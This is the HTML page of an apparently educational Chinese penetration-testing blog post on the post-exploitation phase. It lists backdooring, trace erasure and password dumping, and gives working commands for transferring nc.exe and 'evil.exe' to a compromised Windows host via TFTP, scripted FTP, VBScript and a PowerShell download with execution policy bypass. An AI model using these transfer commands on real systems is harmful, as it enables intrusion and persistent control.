@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="后漏洞利用阶段漏洞利用后阶段 上传工具  提权  擦除攻击痕迹  安装后门   长期控制 Dump密码 内网渗透   后漏洞利用阶段   最大的挑战——防病毒软件 使用合法的远程控制软件   上传文件   持久控制 扩大对目标系统的控制能力   Linux系统   netcat curl wget   Windows   缺少预装的下载工具   非交互模式shell   类NC远程控制shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞后利用阶段">
+<meta property="og:url" content="http://yoursite.com/2018/03/19/漏洞后利用阶段/index.html">
+<meta property="og:site_name" content="Chace Blog">
+<meta property="og:description" content="后漏洞利用阶段漏洞利用后阶段 上传工具  提权  擦除攻击痕迹  安装后门   长期控制 Dump密码 内网渗透   后漏洞利用阶段   最大的挑战——防病毒软件 使用合法的远程控制软件   上传文件   持久控制 扩大对目标系统的控制能力   Linux系统   netcat curl wget   Windows   缺少预装的下载工具   非交互模式shell   类NC远程控制shell">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-19T02:12:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="漏洞后利用阶段">
+<meta name="twitter:description" content="后漏洞利用阶段漏洞利用后阶段 上传工具  提权  擦除攻击痕迹  安装后门   长期控制 Dump密码 内网渗透   后漏洞利用阶段   最大的挑战——防病毒软件 使用合法的远程控制软件   上传文件   持久控制 扩大对目标系统的控制能力   Linux系统   netcat curl wget   Windows   缺少预装的下载工具   非交互模式shell   类NC远程控制shell">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>漏洞后利用阶段</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/03/21/提权/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/03/18/Linux缓冲区溢出/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/03/19/漏洞后利用阶段/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&text=漏洞后利用阶段"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&is_video=false&description=漏洞后利用阶段"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=漏洞后利用阶段&body=Check out this article: http://yoursite.com/2018/03/19/漏洞后利用阶段/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&name=漏洞后利用阶段&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#后漏洞利用阶段"><span class="toc-number">1.</span> <span class="toc-text">后漏洞利用阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用后阶段"><span class="toc-number">1.0.1.</span> <span class="toc-text">漏洞利用后阶段</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        漏洞后利用阶段
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Chace Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-03-19T02:11:14.000Z" itemprop="datePublished">2018-03-19</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="后漏洞利用阶段"><a href="#后漏洞利用阶段" class="headerlink" title="后漏洞利用阶段"></a>后漏洞利用阶段</h2><h4 id="漏洞利用后阶段"><a href="#漏洞利用后阶段" class="headerlink" title="漏洞利用后阶段"></a>漏洞利用后阶段</h4><ul>
+<li><p>上传工具</p>
+</li>
+<li><p>提权</p>
+</li>
+<li><p>擦除攻击痕迹</p>
+</li>
+<li><p>安装后门</p>
+</li>
+<li><ul>
+<li>长期控制</li>
+<li>Dump密码</li>
+<li>内网渗透</li>
+</ul>
+</li>
+<li><p>后漏洞利用阶段</p>
+</li>
+<li><ul>
+<li>最大的挑战——防病毒软件</li>
+<li>使用合法的远程控制软件</li>
+</ul>
+</li>
+<li><p>上传文件</p>
+</li>
+<li><ul>
+<li>持久控制</li>
+<li>扩大对目标系统的控制能力</li>
+</ul>
+</li>
+<li><p>Linux系统</p>
+</li>
+<li><ul>
+<li>netcat</li>
+<li>curl</li>
+<li>wget</li>
+</ul>
+</li>
+<li><p>Windows</p>
+</li>
+<li><ul>
+<li>缺少预装的下载工具</li>
+</ul>
+</li>
+<li><p>非交互模式shell</p>
+</li>
+<li><ul>
+<li>类NC远程控制shell</li>
+<li>ftp 192.168.1.1</li>
+</ul>
+</li>
+<li><p>传输文件</p>
+</li>
+<li><ul>
+<li>Tftp</li>
+<li>Ftp</li>
+<li>Vbscript</li>
+<li>Debug</li>
+</ul>
+</li>
+<li><p>使用TFTP传输文件</p>
+</li>
+<li><ul>
+<li>XP 2003 默认安装</li>
+<li>Win7 2008 需要单独添加</li>
+<li>经常被边界防火墙过滤</li>
+<li>kali</li>
+<li><ul>
+<li>mkdir /tftp</li>
+<li>atftpd –daemon –port 69 /tftp</li>
+<li>cp /usr/share/windows-binaries/nc.exe /tftp/</li>
+<li>chown -R nobody /tftp</li>
+</ul>
+</li>
+<li>windows</li>
+<li>tftp -i 192.168.10.5 get nc.exe</li>
+</ul>
+</li>
+<li><p>使用FTP传输文件</p>
+</li>
+<li><ul>
+<li><p>kali</p>
+</li>
+<li><p>apt-get install pure-ftpd</p>
+</li>
+<li><p>Windows</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.10.5 21 &gt; ftp.txt</span><br><span class="line">echo yuanfh &gt;&gt; ftp.txt</span><br><span class="line">echo password &gt;&gt; ftp.txt</span><br><span class="line">echo bin &gt;&gt; ftp.txt</span><br><span class="line">echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br><span class="line">ftp -s:ftp.txt</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>使用VBSCRIPT 传输文件</p>
+</li>
+<li><ul>
+<li>service apache2 start</li>
+<li>cd /var/www/html cp/ftphome/whoami.exe</li>
+</ul>
+</li>
+<li><ul>
+<li>wget.vbs</li>
+<li>cscript wget.vbs <a href="http://192.168.1.117/nc.exe" target="_blank" rel="noopener">http://192.168.1.117/nc.exe</a> nc.exe</li>
+</ul>
+</li>
+<li><p>使用POWERSHELL传输文件</p>
+</li>
+<li><ul>
+<li><p>Wget.ps</p>
+</li>
+<li><p>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</p>
+</li>
+<li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$storageDir</span> = <span class="variable">$pwd</span></span><br><span class="line"><span class="variable">$webclient</span> = <span class="built_in">New-Object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$url</span> = <span class="string">"http://192.168.10.5/evil.exe"</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">"new-exploit.exe"</span></span><br><span class="line"><span class="variable">$webclient</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>使用DEBUG传输文件</p>
+</li>
+<li><p>Debug</p>
+</li>
+<li><ul>
+<li>汇编、反汇编</li>
+<li>16进制dump工具</li>
+<li>64K字节</li>
+</ul>
+</li>
+<li><p>upx压缩文件</p>
+</li>
+<li><p>wine exe2bat.exe nc.exe nc.txt</p>
+</li>
+<li><p>debug&lt;nc.hex</p>
+</li>
+<li><p>copy 1.dll nc.exe</p>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#后漏洞利用阶段"><span class="toc-number">1.</span> <span class="toc-text">后漏洞利用阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用后阶段"><span class="toc-number">1.0.1.</span> <span class="toc-text">漏洞利用后阶段</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/03/19/漏洞后利用阶段/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&text=漏洞后利用阶段"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&is_video=false&description=漏洞后利用阶段"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=漏洞后利用阶段&body=Check out this article: http://yoursite.com/2018/03/19/漏洞后利用阶段/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&title=漏洞后利用阶段"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/03/19/漏洞后利用阶段/&name=漏洞后利用阶段&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 jsmhny
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
